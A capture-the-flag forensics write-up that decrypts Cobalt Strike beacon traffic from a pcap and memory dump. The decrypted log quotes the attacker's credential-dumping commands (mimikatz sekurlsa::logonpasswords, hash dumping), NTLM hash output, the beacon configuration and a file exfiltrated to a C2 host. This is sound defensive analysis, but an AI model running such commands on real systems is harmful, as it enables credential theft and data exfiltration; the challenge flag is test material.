# Strike Back
> Write-up author: jon-brandy
## DESCRIPTION:
A fleet of steam blimps waits the final signal from their commander in order to attack gogglestown kingdom. 
A recent cyber attack had us thinking if the enemy managed to discover our plans and prepare a counter-attack. Will the fleet get ambused???
## HINT:
- NONE
## STEPS:
1. First, unzip the `.zip` file given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/214206472-10e6c6df-228f-42b6-bb63-1f79dfb42ae3.png)


2. Check both file types.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/214206750-07982c40-0f7b-4cd1-bfaf-cfec3e95dea5.png)

3. The `.dmp` files contains **Mini DuMP crash report, 17 streams**. Let's strings that file to see if we can get any clue.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/214206934-6ccd5134-1714-408d-970c-8c653f346d95.png)


![image](https://user-images.githubusercontent.com/70703371/214206996-01294d22-cf52-4f89-bf4c-da039d30032e.png)


![image](https://user-images.githubusercontent.com/70703371/214207001-9600ef30-218c-41b3-b51d-0241e6700e7d.png)


4. Got a username -> `npatrick` and notice the user seems download a `PE` file named **freesteam.exe**. Let's binwalk the `.dmp` file, to see if there are any files we can extract.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/214207262-c935a82d-c2ab-4034-9cc3-148cb434d5da.png)


> EXTRACTED

![image](https://user-images.githubusercontent.com/70703371/214207333-2635988e-3c01-4612-b98b-4952e227375c.png)


![image](https://user-images.githubusercontent.com/70703371/214207514-ec0b7d02-8d69-426e-a175-752af64f8772.png)



5. Hmm.. Let's open the `.pcap` file then.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/214207548-e638691a-49a5-4f7d-b8fc-f29fc8e6b51e.png)


6. All the http packets seems should be our interest here, let's export all of them.

![image](https://user-images.githubusercontent.com/70703371/214208502-179655dc-2b33-4d7f-b713-d1941079ff7b.png)


![image](https://user-images.githubusercontent.com/70703371/214208658-a36c769d-29f8-4a25-aecc-bc93428f7713.png)


![image](https://user-images.githubusercontent.com/70703371/214208926-ba03f716-c677-4ad2-a226-1211867fcc20.png)


7. Let's decompile the `freesteam.exe`.
8. When analyzing this function.

![image](https://user-images.githubusercontent.com/70703371/214209454-ce505c2e-1be2-4bb3-8a0f-cd3fb2a4c4a4.png)

> This undefined function seems execute a shellcode

![image](https://user-images.githubusercontent.com/70703371/214209588-fa5e494b-5327-4ecf-9eba-aa77eeac78bd.png)


9. Since it's a forensic challenge, i tried to upload the `PE` file to **virustotal** webapp and got this:

> RESULT

![image](https://user-images.githubusercontent.com/70703371/214209878-7bf0608d-914c-4224-86a7-ea8e3f94da01.png)


![image](https://user-images.githubusercontent.com/70703371/214209907-4e2a4c2e-40f9-4495-949d-9967bc61e2dd.png)


10. Based on the output, i think this chall related to **Cobalt Strike Beacon Attacks**. I did a small outsource about this attack and found several article discussing this concept.

```
https://blog.nviso.eu/2021/10/21/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-1/
https://blog.nviso.eu/2021/11/17/cobalt-strike-decrypting-obfuscated-traffic-part-4/
https://blog.nviso.eu/2021/11/03/cobalt-strike-using-process-memory-to-decrypt-traffic-part-3/
https://blog.didierstevens.com/2021/10/11/update-1768-py-version-0-0-8/
https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py
https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py
```

11. First let's get the public and private key (if there is) using [this](https://blog.didierstevens.com/2021/10/11/update-1768-py-version-0-0-8/) python script.

```sh
python 1768.py ../../../Downloads/htb/foren/exportHttp/iVd9 -V 
```

> RESULT

```
File: ../../../Downloads/htb/foren/exportHttp/iVd9
xorkey(chain): 0xb9ce3940
length: 0x00032600
payloadType: 0x10014522
payloadSize: 0x00000000
intxorkey: 0x00000000
id2: 0x00000000
Config found: xorkey b'.' 0x0002f610 0x00032600
0x0001 payload type                     0x0001 0x0002 0 windows-beacon_http-reverse_http
0x0002 port                             0x0001 0x0002 80
0x0003 sleeptime                        0x0002 0x0004 60000
0x0004 maxgetsize                       0x0002 0x0004 1048576
0x0005 jitter                           0x0001 0x0002 0
0x0006 maxdns                           0x0001 0x0002 255
0x0007 publickey                        0x0003 0x0100 30819f300d06092a864886f70d010101050003818d003081890281810090675223e8a456ebda21cb31552d9f58e675bfa1dabeefbdc3071e5d8d9e263500f9665ce43bc9d0e51aa869b19250d855c8c19f3bac59fc7b4de2164ba4e9327f713436fb283d6cc7326b40755f39209643c1a13bcaaeef082b7a070342254cb2a971c17e43ec095a598678fd02360097fb4a3740d279c8ca61ed3e1b5de96d020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
0x0008 server,get-uri                   0x0003 0x0100 '192.168.1.9,/match'
0x0009 useragent                        0x0003 0x0080 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; .NET4.0C)'
0x000a post-uri                         0x0003 0x0040 '/submit.php'
0x000b Malleable_C2_Instructions        0x0003 0x0100 '\x00\x00\x00\x04'
0x000c http_get_header                  0x0003 0x0100
  Cookie
0x000d http_post_header                 0x0003 0x0100
  &Content-Type: application/octet-stream
  id
0x000e SpawnTo                          0x0003 0x0010 (NULL ...)
0x001d spawnto_x86                      0x0003 0x0040 '%windir%\\syswow64\\rundll32.exe'
0x001e spawnto_x64                      0x0003 0x0040 '%windir%\\sysnative\\rundll32.exe'
0x000f pipename                         0x0003 0x0080 (NULL ...)
0x001f CryptoScheme                     0x0001 0x0002 0
0x0013 DNS_Idle                         0x0002 0x0004 0 0.0.0.0
0x0014 DNS_Sleep                        0x0002 0x0004 0
0x001a get-verb                         0x0003 0x0010 'GET'
0x001b post-verb                        0x0003 0x0010 'POST'
0x001c HttpPostChunk                    0x0002 0x0004 0
0x0025 license-id                       0x0002 0x0004 16777216 Stats uniques -> ips/hostnames: 17 publickeys: 17
0x0026 bStageCleanup                    0x0001 0x0002 0
0x0027 bCFGCaution                      0x0001 0x0002 0
0x0036 HostHeader                       0x0003 0x0080 (NULL ...)
0x0032 UsesCookies                      0x0001 0x0002 1
0x0023 proxy_type                       0x0001 0x0002 2 IE settings
0x003a                                  0x0003 0x0080 '\x00\x04'
0x0039                                  0x0003 0x0080 '\x00\x04'
0x0037                                  0x0001 0x0002 0
0x0028 killdate                         0x0002 0x0004 0
0x0029 textSectionEnd                   0x0002 0x0004 0
0x002b process-inject-start-rwx         0x0001 0x0002 64 PAGE_EXECUTE_READWRITE
0x002c process-inject-use-rwx           0x0001 0x0002 64 PAGE_EXECUTE_READWRITE
0x002d process-inject-min_alloc         0x0002 0x0004 0
0x002e process-inject-transform-x86     0x0003 0x0100 (NULL ...)
0x002f process-inject-transform-x64     0x0003 0x0100 (NULL ...)
0x0035 process-inject-stub              0x0003 0x0010 'd\\ÃÂê·Íñ¡T,¬\x13¾\x0c\x07'
0x0033 process-inject-execute           0x0003 0x0080 '\x01\x02\x03\x04'
0x0034 process-inject-allocation-method 0x0001 0x0002 0
0x0000
Guessing Cobalt Strike version: 4.2 (max 0x003a)
```

12. Got the public key but no private key. Also there's `Malleable_C2_Instructions` -> `\x00\x00\x00\x04`.
13. Convert it from little-endian we know it's 4 bytes. Confused here, so read the documentation again and found out that we need to grep data from a post http stream but with a len of 68 bytes. Then pass in as the `-c` parameter when used `cs-extract-key.py` script.

> RESULT - COPY AS A HEX STREAM

![image](https://user-images.githubusercontent.com/70703371/214213370-644c37b5-4509-45bb-a2ee-51000df5c1ba.png)


> USED IT ON THE SCRIPT - PASS IT FOR .DMP FILE

![image](https://user-images.githubusercontent.com/70703371/214213451-e6c37e68-1300-4819-bbe4-61f801c153c4.png)


![image](https://user-images.githubusercontent.com/70703371/214213540-3079eca4-993f-49ec-a757-0029d89f6cb0.png)


14. The problem now is we didn't have the raw key so we can't use the same method as the documentation we found for using `cs-parse-http-traffic.py`.
15. But we can use the `SHA256 raw key`. For the flag we shall use `-k` -> `hmacaeskeys`. Because the `SHA256 raw key` has the same value for hmac - aes.

![image](https://user-images.githubusercontent.com/70703371/214214498-86c9743d-5219-4c6f-ba87-8ce8cc2ebd5c.png)


```
python cs-parse-http-traffic.py -k bf2d35c0e9b64bc46e6d513c1d0f6ffe:3ae7f995a2392c86e3fa8b6fbc3d953a ../../../Downloads/htb/foren/capture.pcap
```

> RESULT

```
Packet number: 12
HTTP response (for request 7 GET)
Length raw data: 14336
HMAC signature invalid
Packet number: 47
HTTP response (for request 23 GET)
Length raw data: 206401
HMAC signature invalid
Packet number: 69
HTTP response (for request 66 GET)
Length raw data: 48
Timestamp: 1637354721 20211119-204521
Data size: 8
Command: 27 GETUID
 Arguments length: 0

Packet number: 76
HTTP request POST
http://192.168.1.9/submit.php?id=1909272864
Length raw data: 68
Counter: 2
Callback: 16 BEACON_GETUID
b'WS02\\npatrick (admin)'

Packet number: 101
HTTP response (for request 86 GET)
Length raw data: 87648
Timestamp: 1637354781 20211119-204621
Data size: 87608
Command: 89 UNKNOWN
 Arguments length: 87552
 b'MZ\xe8\x00\x00\x00\x00[REU\x89\xe5\x81\xc3)\x1f\x00\x00\xff\xd3\x89\xc3Wh\x04\x00\x00\x00P\xff\xd0
 MD5: 1e4b88220d370c6bc55e213761f7b5ac
Command: 40 UNKNOWN
 Arguments length: 40
 Unknown1: 0
 Unknown2: 1602864
 Pipename: b'\\\\.\\pipe\\8e09448'
 Command: b'net user'
 b''

Packet number: 109
HTTP request POST
http://192.168.1.9/submit.php?id=1909272864
Length raw data: 724
Counter: 3
Callback: 24 BEACON_OUTPUT_NET
b"Account information for npatrick on \\\\localhost:\n\nUser name                    npatrick\nFull Name                    npatrick\nComment                      Fleet Commander\nUser's Comment               \nCountry code                 0\nAccount active               Yes\nAccount expires              Never\nAccount type                 Admin\n\nPassword last set            221 hours ago\nPassword expires             Yes\nPassword changeable          Yes\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         \nLogon script                 \nUser profile                 \nHome directory               \nLast logon                   11/19/2021 12:41:23\n"

Packet number: 135
HTTP response (for request 119 GET)
Length raw data: 82528
Timestamp: 1637354843 20211119-204723
Data size: 82501
Command: 44 UNKNOWN
 Arguments length: 82432
 b'MZARUH\x89\xe5H\x81\xec \x00\x00\x00H\x8d\x1d\xea\xff\xff\xffH\x81\xc3T\x16\x00\x00\xff\xd3H\x89\x
 MD5: 851cbc5a118178f5c548e573a719d221
Command: 40 UNKNOWN
 Arguments length: 53
 Unknown1: 0
 Unknown2: 1391256
 Pipename: b'\\\\.\\pipe\\8a4f8bc8'
 Command: b'dump password hashes'
 b''

Packet number: 143
HTTP request POST
http://192.168.1.9/submit.php?id=1909272864
Length raw data: 548
Counter: 4
Callback: 21 BEACON_OUTPUT_HASHES
b'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nJohn Doe:1001:aad3b435b51404eeaad3b435b51404ee:37fbc1731f66ad4e524160a732410f9d:::\nnpatrick:1002:aad3b435b51404eeaad3b435b51404ee:3c7c8387d364a9c973dc51a235a1d0c8:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c81c8295ec4bfa3c9b90dcd6c64727e2:::\n'

Packet number: 190
HTTP response (for request 153 GET)
Length raw data: 438896
Timestamp: 1637354904 20211119-204824
Data size: 438866
Command: 44 UNKNOWN
 Arguments length: 438784
 b'MZARUH\x89\xe5H\x81\xec \x00\x00\x00H\x8d\x1d\xea\xff\xff\xffH\x81\xc3\xb8\x87\x00\x00\xff\xd3H\x8
 MD5: b0cfbef2bd9a171b3f48e088b8ae2a99
Command: 40 UNKNOWN
 Arguments length: 66
 Unknown1: 0
 Unknown2: 2112152
 Pipename: b'\\\\.\\pipe\\673dd5c0'
 Command: b'mimikatz sekurlsa::logonpasswords'
 b''

Packet number: 204
HTTP request POST
http://192.168.1.9/submit.php?id=1909272864
Length raw data: 4516
Counter: 5
Callback: 32 UNKNOWN

Authentication Id : 0 ; 334782 (00000000:00051bbe)
Session           : Interactive from 1
User Name         : npatrick
Domain            : WS02
Logon Server      : WS02
Logon Time        : 11/19/2021 12:40:19 PM
SID               : S-1-5-21-3301052303-2181805973-2384618940-1002
        msv :
         [00000003] Primary
         * Username : npatrick
         * Domain   : .
         * NTLM     : 3c7c8387d364a9c973dc51a235a1d0c8
         * SHA1     : 44cb46af6b1e8c5873bee400115d1694e650c5b4
        tspkg :
        wdigest :
         * Username : npatrick
         * Domain   : WS02
         * Password : (null)
        kerberos :
         * Username : npatrick
         * Domain   : WS02
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 334736 (00000000:00051b90)
Session           : Interactive from 1
User Name         : npatrick
Domain            : WS02
Logon Server      : WS02
Logon Time        : 11/19/2021 12:40:19 PM
SID               : S-1-5-21-3301052303-2181805973-2384618940-1002
        msv :
         [00000003] Primary
         * Username : npatrick
         * Domain   : .
         * NTLM     : 3c7c8387d364a9c973dc51a235a1d0c8
         * SHA1     : 44cb46af6b1e8c5873bee400115d1694e650c5b4
        tspkg :
        wdigest :
         * Username : npatrick
         * Domain   : WS02
         * Password : (null)
        kerberos :
         * Username : npatrick
         * Domain   : WS02
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 46420 (00000000:0000b554)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : WS02$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 46226 (00000000:0000b492)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : WS02$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WS02$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : WS02$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : ws02$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 26445 (00000000:0000674d)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : S-1-5-96-0-0
        msv :
        tspkg :
        wdigest :
         * Username : WS02$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 26411 (00000000:0000672b)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : S-1-5-96-0-1
        msv :
        tspkg :
        wdigest :
         * Username : WS02$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 25289 (00000000:000062c9)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : 
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WS02$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WS02$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : ws02$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Extra packet data: b'\x00\x00\x00'

Packet number: 217
HTTP response (for request 214 GET)
Length raw data: 80
Timestamp: 1637354965 20211119-204925
Data size: 43
Command: 53 LIST_FILES
 Arguments length: 35
 b'\xff\xff\xff\xfe\x00\x00\x00\x1bC:\\Users\\npatrick\\Desktop\\*'
 MD5: 2211925feba04566b12e81807ff9c0b4

Packet number: 224
HTTP request POST
http://192.168.1.9/submit.php?id=1909272864
Length raw data: 324
Counter: 6
Callback: 22 TODO
b'\xff\xff\xff\xfe'
----------------------------------------------------------------------------------------------------
C:\Users\npatrick\Desktop\*
D       0       11/19/2021 12:24:08     .
D       0       11/19/2021 12:24:08     ..
F       5175    11/11/2021 03:24:13     cheap_spare_parts_for_old_blimps.docx
F       282     11/10/2021 07:02:24     desktop.ini
F       24704   11/11/2021 03:22:16     gogglestown_citizens_osint.xlsx
F       62393   11/19/2021 12:24:10     orders.pdf

----------------------------------------------------------------------------------------------------

Packet number: 237
HTTP response (for request 234 GET)
Length raw data: 80
Timestamp: 1637355025 20211119-205025
Data size: 44
Command: 11 DOWNLOAD
 Arguments length: 36
 b'C:\\Users\\npatrick\\Desktop\\orders.pdf'
 MD5: b25952a4fd6a97bac3ccc8f2c01b906b

Packet number: 254
HTTP request POST
http://192.168.1.9/submit.php?id=1909272864
Length raw data: 62572
Counter: 7
Callback: 2 DOWNLOAD_START
 parameter1: 0
 length: 62393
 filenameDownload: C:\Users\npatrick\Desktop\orders.pdf

Counter: 8
Callback: 8 DOWNLOAD_WRITE
 Length: 62393
 MD5: 00f542efefccd7a89a55c133180d8581

Counter: 9
Callback: 9 DOWNLOAD_COMPLETE
b'\x00\x00\x00\x00'


Commands summary:
 11 DOWNLOAD: 1
 27 GETUID: 1
 40 UNKNOWN: 3
 44 UNKNOWN: 2
 53 LIST_FILES: 1
 89 UNKNOWN: 1

Callbacks summary:
 2 DOWNLOAD_START: 1
 8 DOWNLOAD_WRITE: 1
 9 DOWNLOAD_COMPLETE: 1
 16 BEACON_GETUID: 1
 21 BEACON_OUTPUT_HASHES: 1
 22 TODO: 1
 24 BEACON_OUTPUT_NET: 1
 32 UNKNOWN: 1
```

16. We got these files:

![image](https://user-images.githubusercontent.com/70703371/214214727-da805930-1f95-475a-bb45-0ba1a0693fc3.png)


17. Let's crack all of these md5 hashes (some of them are duplicated).

![image](https://user-images.githubusercontent.com/70703371/214214828-f7217fce-682c-4ea5-bdd9-944665653876.png)


> RESULT

![image](https://user-images.githubusercontent.com/70703371/214215068-b8891b6f-6eab-4a68-b58a-1f002aea1600.png)


> OUR INTEREST

![image](https://user-images.githubusercontent.com/70703371/214215199-a18c9ba3-51c1-4f54-b692-482edc4ecea3.png)


18. Let's extract our files with `-e` flag using the same script and payload as before.

```sh
python cs-parse-http-traffic.py -k bf2d35c0e9b64bc46e6d513c1d0f6ffe:3ae7f995a2392c86e3fa8b6fbc3d953a -e ../../../Downloads/htb/foren/capture.pcap
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/214215511-97db802c-a5a6-4c84-91b8-036e7e4c068f.png)


19. I thought i might stuck here again for a while since i'm not familiar with the `.vir`. But when i tried to see it straight from the directory GUI. Found the flag inside the `.pdf` file.

![image](https://user-images.githubusercontent.com/70703371/214215610-bb973f78-9eb9-4a85-aa11-c5330ef7e800.png)


20. Got the flag!

## FLAG

```
HTB{Th4nk_g0d_y0u_f0und_1t_0n_T1m3!!!!}
```

## LEARNING REFERENCES:

```
https://blog.nviso.eu/2021/10/21/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-1/
https://blog.nviso.eu/2021/11/17/cobalt-strike-decrypting-obfuscated-traffic-part-4/
https://blog.nviso.eu/2021/11/03/cobalt-strike-using-process-memory-to-decrypt-traffic-part-3/
https://blog.didierstevens.com/2021/10/11/update-1768-py-version-0-0-8/
https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py
https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py
```



